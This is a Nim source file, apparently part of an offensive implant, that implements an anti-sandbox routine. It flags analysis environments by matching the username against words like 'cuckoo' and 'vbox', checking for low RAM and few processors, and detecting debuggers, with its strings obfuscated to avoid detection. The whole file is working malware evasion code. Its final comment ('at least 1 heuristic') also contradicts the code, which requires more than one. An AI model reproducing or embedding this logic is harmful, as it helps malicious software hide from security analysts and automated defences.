import winim/lean
import strutils
import times
import os

import ../../util/strenc


# Anti-sandbox heuristics
proc antiSandbox*(): bool =
    var heuristic = 0

    # 1. Check username for sandbox-related names
    let sandboxNames = [
        obf("sandbox"), obf("vmware"), obf("virtual"), obf("vbox"), obf("qemu"),
        obf("xen"), obf("analysis"), obf("cuckoo"), obf("malware"), obf("virus"),
        obf("sample"), obf("analyze"), obf("lab"), obf("maltest"), obf("vm"), obf("virt")
    ]
    let username = getEnv(obf("USERNAME"), "").toLowerAscii()

    var found = false
    for name in sandboxNames:
        if username.contains(name):
            found = true
            break
    if found:
        heuristic += 1

    # 2. Check available system memory (< 4GB)
    var memStatus: MEMORYSTATUSEX
    memStatus.dwLength = DWORD(sizeof(memStatus))
    const fourGB: DWORDLONG = DWORDLONG(4'u64 * 1024 * 1024 * 1024)
    
    if bool(GlobalMemoryStatusEx(addr memStatus)) and memStatus.ullTotalPhys < fourGB:
        heuristic += 1

    # 3. Check number of logical processors (≤ 2)
    var sysInfo: SYSTEM_INFO
    GetSystemInfo(addr sysInfo)
    if sysInfo.dwNumberOfProcessors <= 2:
        heuristic += 1

    # 4. Debugger checks
    var checkRemote: BOOL
    discard CheckRemoteDebuggerPresent(GetCurrentProcess(), addr checkRemote)

    let dbg1 = bool(IsDebuggerPresent())
    let dbg2 = checkRemote == TRUE
    if dbg1 or dbg2:
        heuristic += 1

    return heuristic > 1 # at least 1 heuristic must be true / This could be improved
